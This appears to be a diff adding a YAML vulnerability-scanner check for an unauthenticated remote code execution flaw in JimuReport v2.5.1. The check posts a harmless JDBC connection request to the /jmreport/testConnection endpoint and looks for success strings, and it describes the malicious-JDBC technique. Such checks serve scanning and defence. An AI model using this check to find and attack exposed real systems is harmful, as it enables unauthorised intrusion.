@@ -1,0 +1,20 @@
+name: poc-yaml-jimureport-testconnection-rce
+groups:
+  rce:
+    - method: POST
+      path: /jmreport/testConnection
+      headers:
+        Content-Type: application/json
+      body: >-
+        {"dbType":"MYSQL","dbUrl":"jdbc:mysql://127.0.0.1:3306/test?autoReconnect=true&useUnicode=true&characterEncoding=utf-8&useSSL=false&allowPublicKeyRetrieval=true&serverTimezone=Asia/Shanghai","dbUsername":"root","dbPassword":"root"}
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"success") || response.body.bcontains(b"连接成功") || response.body.bcontains(b"true"))
+detail:
+  author: L4xy
+  description: "JimuReport积木报表v2.5.1存在未授权远程代码执行漏洞，攻击者可通过testConnection接口构造恶意JDBC连接实现远程代码执行"
+  links:
+    - https://github.com/jeecgboot/jimureport/issues/4774
+    - https://github.com/mhtsec/jimureport-2.5.1-rce
+    - https://www.secrss.com/articles/93725
+  tags: rce,jimureport,jeecgboot
